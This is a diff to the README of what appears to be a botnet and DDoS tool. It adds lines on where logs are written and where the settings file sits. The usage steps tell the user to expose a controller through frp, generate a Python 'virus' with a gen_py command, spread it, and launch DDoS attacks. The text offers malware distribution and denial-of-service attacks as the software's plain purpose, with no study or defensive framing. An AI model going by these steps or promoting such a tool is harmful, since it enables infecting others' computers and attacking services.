@@ -28,12 +28,15 @@ All you need is a computer and an Intranet Penetration software (frp) to set up 
     (python 3.7+, best for 3.11)  
 
 ## Usage  
+  ### Basic Usage
   1. Input your ip and port (ex:127.0.0.1, 1234)
   2. Get the public network ip and port using frp and input it (ex:1.2.3.4, 12345)
   3. generate .py virus (using command : gen_py) and spread the virus
   4. use ddos attack method to attack!
+  The log will be write in ./Data/History.config
+  ### Set your own config
+  set your own config at ./Data/settings.json
      
-   
 ## Maintainers
 [@D0WE1L1N](https://github.com/Duweilin).
 
